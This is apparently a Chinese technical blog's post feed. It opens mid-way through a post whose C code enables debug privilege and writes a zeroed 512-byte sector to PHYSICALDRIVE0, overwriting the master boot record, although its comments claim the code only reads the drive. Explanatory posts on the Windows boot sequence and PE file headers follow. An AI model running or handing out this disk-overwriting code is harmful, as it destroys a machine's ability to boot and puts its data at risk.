number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0xAA</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//自己写一个函数来提权。</span><span class="token keyword">void</span> <span class="token function">GetPrivileges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//定义一个PLUID</span>HANDLE hProcess<span class="token punctuation">;</span>HANDLE hTokenHandle<span class="token punctuation">;</span>TOKEN_PRIVILEGES tp<span class="token punctuation">;</span><span class="token comment">//获取当前进程的句柄</span>hProcess <span class="token operator">=</span> <span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">OpenProcessToken</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> TOKEN_ADJUST_PRIVILEGES <span class="token operator">|</span> TOKEN_QUERY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hTokenHandle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//函数查看系统权限的特权值，返回信息到一个LUID结构体里。</span>tp<span class="token punctuation">.</span>PrivilegeCount <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token function">LookupPrivilegeValue</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>SE_DEBUG_NAME<span class="token punctuation">,</span><span class="token operator">&amp;</span>tp<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Luid<span class="token punctuation">)</span><span class="token punctuation">;</span> tp<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Attributes <span class="token operator">=</span>SE_PRIVILEGE_ENABLED<span class="token punctuation">;</span><span class="token function">AdjustTokenPrivileges</span><span class="token punctuation">(</span>hTokenHandle<span class="token punctuation">,</span>FALSE<span class="token punctuation">,</span><span class="token operator">&amp;</span>tp<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>tp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hTokenHandle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//下面的函数来读取"\\\\.\\PHYSICALDRIVE0"</span><span class="token keyword">void</span> <span class="token function">ReadPHYSICALDRIVE0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>HANDLE hFile<span class="token punctuation">;</span>DWORD dwReadSize<span class="token punctuation">;</span><span class="token comment">// char lpBuffer[512];</span><span class="token comment">//使用createFile打开这个文件</span><span class="token keyword">char</span> str_Name<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\\\.\\PHYSICALDRIVE0"</span><span class="token punctuation">;</span>hFile <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>str_Name<span class="token punctuation">,</span> GENERIC_READ <span class="token operator">|</span> GENERIC_WRITE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> OPEN_EXISTING <span class="token punctuation">,</span> FILE_ATTRIBUTE_NORMAL <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hFile <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"wrong"</span><span class="token punctuation">,</span> <span class="token string">"wrong"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//用readfile来读取文件</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> temp<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwReadSize<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">GetPrivileges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ReadPHYSICALDRIVE0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mbr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows启动过程</title>
      <link href="/2019/11/20/windows%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/"/>
      <url>/2019/11/20/windows%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>记录了一下windows系统的启动过程。</p><h2 id="预引导阶段（启动自检阶段）"><a href="#预引导阶段（启动自检阶段）" class="headerlink" title="预引导阶段（启动自检阶段）"></a>预引导阶段（启动自检阶段）</h2><p>上个世纪70年代初，”只读内存”（read-only memory，缩写为ROM）发明，开机程序被刷入rom芯片，计算机通电后，第一件事就是读取它。这块芯片里的程序叫做”基本输入输出系统”（Basic Input/Output System），简称为BIOS。<br>通电自检（Power-On Self Test，POST），这一步主要是读取 BIOS ，然后对内存，CPU，硬盘，键盘等设备进行自检。</p><h2 id="引导阶段（初始化启动阶段）"><a href="#引导阶段（初始化启动阶段）" class="headerlink" title="引导阶段（初始化启动阶段）"></a>引导阶段（初始化启动阶段）</h2><p>自检阶段完成后，BIOS把控制权转交给下一阶段排在第一的储存设备，计算机读取该设备的第一个扇区，也就是读取最前面的512个字节。如果这512个字节的最后两个字节是0x55和0xAA，表明这个设备可以用于启动；如果不是，表明设备不能用于启动，控制权于是被转交给”启动顺序”中的下一个设备。这最前面的512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR），之后根据 BIOS 指定的启动顺序，找到可以启动的优先启动设备，比如本地磁盘，CD Driver ， USB 设备等等，然后准备从这些设备启动系统。</p><h2 id="初始化引导载入程序"><a href="#初始化引导载入程序" class="headerlink" title="初始化引导载入程序"></a>初始化引导载入程序</h2><p>这个阶段首先从启动分区（比如 C 盘） 加载 Ntldr ，然后Ntldr 做如下设置：<br>1、内置内存模式，如果是 x86 的处理器，并且操作系统是 32位，则设置为 32-bit flat memory mode，如果是 64 位操作系统 + 64位处理器，则设置为64位内存模式。<br>2、启动文件系统<br>3、读取 boot.ini 文件</p><h2 id="操作系统选择"><a href="#操作系统选择" class="headerlink" title="操作系统选择"></a>操作系统选择</h2><p>这一步时看是否安装了多个操作系统。<br>如果计算机中只安装了一个操作系统，或将操作系统列表的显示时间设置为0，那么将不会显示系统启动列表， Windows启动管理器会直接运行 Windows启动加载器(Windows Boot Loader，文件名为Winload. exe）。<br>如果计算机中同时安装了多个操作系统，Windows启动管理器会根据 BCD 存储中的内容创建并显示一个系统启动列表，用户可以从中选择要启动的操作系统。<br>如果是从休眠状态恢复计算机，那么Windows启动管理器将会运行 Windows 恢复加载器(文件名为 Winresume.exe)。</p><h2 id="硬件检测阶段"><a href="#硬件检测阶段" class="headerlink" title="硬件检测阶段"></a>硬件检测阶段</h2><p>这一过程中主要需要用到Ntdetect.com和Ntldr。当我们在前面的操作系统选择阶段选择了想要载入的Windows系统之后，Ntdetect.com首先要将当前计算机中安装的所有硬件信息收集起来，并列成一个表，接着将该表交给Ntldr（这个表的信息稍后会被用来创建注册表中有关硬件的键）。这里需要被收集信息的硬件类型包括：总线/适配器类型、显卡、通讯端口、串口、浮点运算器（CPU）、可移动存储器、键盘、指示装置（鼠标）。至此，硬件检测操作已经成功完成。</p><h2 id="内核加载阶段"><a href="#内核加载阶段" class="headerlink" title="内核加载阶段"></a>内核加载阶段</h2><p>在内核加载阶段，Ntldr 将首先加载Windows内核 Ntoskrnl.exe 和 硬件抽象层 （HAL）。 HAL 有点类似于嵌入式操作系统下的BSP（Borad support package），这个抽象层对硬件底层的特性进行隔离，对操作系统提供统一的调用接口，操作系统移植到不同硬件时只要改变相应的 HAL 就可以，其它的内核组件不需要修改，这个是操作系统通常的设计模式。<br>接下来Ntldr 从HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet 下读取这台机器安装的驱动程序，然后依次加载驱动程序。<br>驱程序加载完成后，Windows做如下设置：<br>1、创建系统环境变量<br>2、启动 win32.sys ，这个是Windows子系统的内核模式部分。<br>3、启动 csrss.exe，这个是Windows子系统的用户模式部分。<br>4、启动 winlogon.exe<br>5、创建虚拟内存页面文件<br>6、对一些必要的文件进行改名，（主要是驱动文件，如果更新后，需要在下次重启前改名）</p><h2 id="初始化内核阶段"><a href="#初始化内核阶段" class="headerlink" title="初始化内核阶段"></a>初始化内核阶段</h2><p>在这一阶段中主要会完成这四项任务：创建Hardware注册表键、对Control Set注册表键进行复制、载入和初始化设备驱动，以及启动服务。<br>** 创建Hardware注册表键 **<br>首先要在注册表中创建Hardware键，Windows内核会使用在前面的硬件检测阶段收集到的硬件信息来创建HKEY_LOCAL_MACHINE/Hardware键，也就是说，注册表中该键的内容并不是固定的，而是会根据当前系统中的硬件配置情况动态更新。<br>** 对Control Set注册表键进行复制 **<br>如果Hardware注册表键创建成功，那么系统内核将会对Control Set键的内容创建一个备份。这个备份将会被用在系统的高级启动菜单中的“最后一次正确配置”选项。例如，如果我们安装了一个新的显卡驱动，重启动系统之后Hardware注册表键还没有创建成功系统就已经崩溃了，这时候如果选择“最后一次正确配置”选项，系统将会自动使用上一次的Control Set注册表键的备份内容重新生成Hardware键，这样就可以撤销掉之前因为安装了新的显卡驱动对系统设置的更改。<br>** 载入和初始化设备驱动 **<br>在这一阶段里，操作系统内核首先会初始化之前在载入内核阶段载入的底层设备驱动，然后内核会在注册表的HKEY_LOCAL_MACHINE/System/CurrentControlSet/Services键下查找所有Start键值为“1”的设备驱动（图4）。这些设备驱动将会在载入之后立刻进行初始化，如果在这一过程中发生了任何错误，系统内核将会自动根据设备驱动的“ErrorControl”键的数值进行处理。“ErrorControl”键的键值共有四种，分别具有如下含义：<br>0，忽略，继续引导，不显示错误信息。<br>1，正常，继续引导，显示错误信息。<br>2，恢复，停止引导，使用“最后一次正确配置”选项重启动系统。如果依然出错则会忽略该错误。<br>3，严重，停止引导，使用“最后一次正确配置”选项重启动系统。如果依然出错则会停止引导，并显示一条错误信息。</p><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>系统内核成功载入，并且成功初始化所有底层设备驱动后，会话管理器会开始启动高层子系统和服务，然后启动Win32子系统。Win32子系统的作用是控制所有输入/输出设备以及访问显示设备。当所有这些操作都完成后，Windows的图形界面就可以显示出来了，同时我们也将可以使用键盘以及其他I/O设备。</p><p><img src="/2019/11/20/windows%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/image-20250921174009106.png"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件</title>
      <link href="/2019/10/21/PE%E6%96%87%E4%BB%B6/"/>
      <url>/2019/10/21/PE%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>总结一下pe文件</p><p>Microsoft为了让程序在Windows上可移植而做的一种文件格式规定。比如exe就是一种PE文件，再印象中Windows操作系统都能执行exe程序，这就是Microsoft做的让程序在Windows平台上实现移植的功能，这个移植功能的实现是因为规定了exe的格式，Windows在执行exe程序时，PE文件加载器会按照约定加载exe程序，所以程序就能正常运行了。</p><h2 id="PE文件的基本结构"><a href="#PE文件的基本结构" class="headerlink" title="PE文件的基本结构"></a>PE文件的基本结构</h2><p>PE文件的基本结构是PE头和PE体<br>PE头又分为DOS头，DOS存根，NT头，节区头。</p><h3 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h3><p><strong>DOS头文件格式</strong></p><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header    WORD   e_magic;                     // Magic number设置ox5A4D  ascii码值为'MZ'(标志,不会变的标志)    WORD   e_cblp;                      // Bytes on last page of file    WORD   e_cp;                        // Pages in file    WORD   e_crlc;                      // Relocations    WORD   e_cparhdr;                   // Size of header in paragraphs    WORD   e_minalloc;                  // Minimum extra paragraphs needed    WORD   e_maxalloc;                  // Maximum extra paragraphs needed    WORD   e_ss;                        // Initial (relative) SS value    WORD   e_sp;                        // Initial SP value    WORD   e_csum;                      // Checksum    WORD   e_ip;                        // Initial IP value     WORD   e_cs;                        // Initial (relative) CS value    WORD   e_lfarlc;                    // File address of relocation table    WORD   e_ovno;                      // Overlay number    WORD   e_res[4];                    // Reserved words    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)    WORD   e_oeminfo;                   // OEM information; e_oemid specific    WORD   e_res2[10];                  // Reserved words    LONG   e_lfanew;                    //PE头文件的偏移地址  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DOS头是个结构体（IMAGE_DOS_HEADER），在32位系统中占64个字节。<br>其中首尾有两个重要的结构体成员<strong>e_magic</strong>和<strong>e_lfanew</strong><br><strong>e_magic</strong>表示这是一个DOS头，用两个字节4D5A,ASCII码为’MZ’<br><strong>e_lfanew</strong>标注NT头的偏移，通常情况下32位系统下e_lfanew的值通常为000000E0<br>64位系统下e_lfanew的值通常为000000F0</p><h3 id="DOS存根"><a href="#DOS存根" class="headerlink" title="DOS存根"></a>DOS存根</h3><p>DOS存根是可选项，可有可无。在DOS头下方，大小不固定，代码与数据混合。用来在dos环境下执行文件。</p><h3 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h3><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_DOS_HEADER{    DWORD  Signature;                    //PE Signature : 50450000("PE"00)    IMAGE_FILE_HEADER  FileHeader;                //文件头结构体    IMAGE_ OPTIONAL_HEADER32  OptionalHeader;                //可选头结构体} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER32;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>NT头也是一个结构体。它有三个成员。</strong><br>第一个成员是“签名”成员占4个字节，类似于DOS头的“MZ”。<br>第二个成员本身是一个结构体，叫做<strong>文件头</strong>：file header。<br>第三个成员本身也是一个结构体，叫做<strong>可选头</strong>：OptionalHeader</p><p><strong>文件头</strong>本身有七个成员（四个重要成员）：</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _IMAGE_DOS_HEADER{    WORD  Machine;                //每个CPU都拥有唯一的machine码    WORD  NumberOfSections;                //节区数量，当定义节区数与实际不同时会发生错误    DWORD  TimeDateStamp;    DWORD  PointerToSymbolTable;    DWORD  NumberOfSymbols;    WORD  SizeOfOptionalHeader;                //IMAGE_OPTIONAL_HEADER32结构体的大小，固定的    WORD  Characteristics;                //文件属性，0x0002h为可执行文件，0x2000h为DLL文件} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEAD<span aria-hidden="true" 